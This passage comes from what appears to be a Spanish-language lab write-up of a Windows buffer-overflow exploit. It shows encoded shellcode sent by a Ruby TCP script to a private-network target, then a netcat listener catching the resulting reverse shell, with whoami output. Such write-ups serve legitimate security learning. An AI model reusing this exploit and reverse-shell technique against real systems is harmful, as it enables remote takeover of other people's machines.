"\x5a\x4d\x76\xd3\x69\xb2\x39\x14\x07\xa0\xae\xd4\x52\x9a" +
"\x79\xea\x48\xb2\xe6\x79\x17\x42\x60\x62\x80\x15\x25\x54" +
"\xd9\xf3\xdb\xcf\x73\xe1\x21\x89\xbc\xa1\xfd\x6a\x42\x28" +
"\x73\xd6\x60\x3a\x4d\xd7\x2c\x6e\x01\x8e\xfa\xd8\xe7\x78" +
"\x4d\xb2\xb1\xd7\x07\x52\x47\x14\x98\x24\x48\x71\x6e\xc8" +
"\xf9\x2c\x37\xf7\x36\xb9\xbf\x80\x2a\x59\x3f\x5b\xef\x79" +
"\xa2\x49\x1a\x12\x7b\x18\xa7\x7f\x7c\xf7\xe4\x79\xff\xfd" +
"\x94\x7d\x1f\x74\x90\x3a\xa7\x65\xe8\x53\x42\x89\x5f\x53" +
"\x47"
#Shellcode

require 'socket'

TCPSocket.open("10.0.69.5","31337") { |s| s.puts buff }
{% endhighlight %} 

Finalmente, abrir el puerto 1234 con netcat para ganar acceso con una reverse shell.

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ nc -nlvp 1234
listening on [any] 1234 ...

connect to [10.0.69.4] from (UNKNOWN) [10.0.69.5] 49194
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\spokbof\Desktop>whoami
whoami
spokbof-pc\spokbof
C:\Users\spokbof\Desktop>

{% endhighlight %} 

Pwned!


[rustscan]: https://github.com/RustScan/RustScan
[ffuf]: https://github.com/ffuf/ffuf
[pry]: https://zoomadmin.com/HowToInstall/UbuntuPackage/pry
[badchars]: https://github.com/dievus/bufferoverflow/blob/master/badchars
[redisvstudio]: https://www.microsoft.com/es-cl/download/details.aspx?id=48145
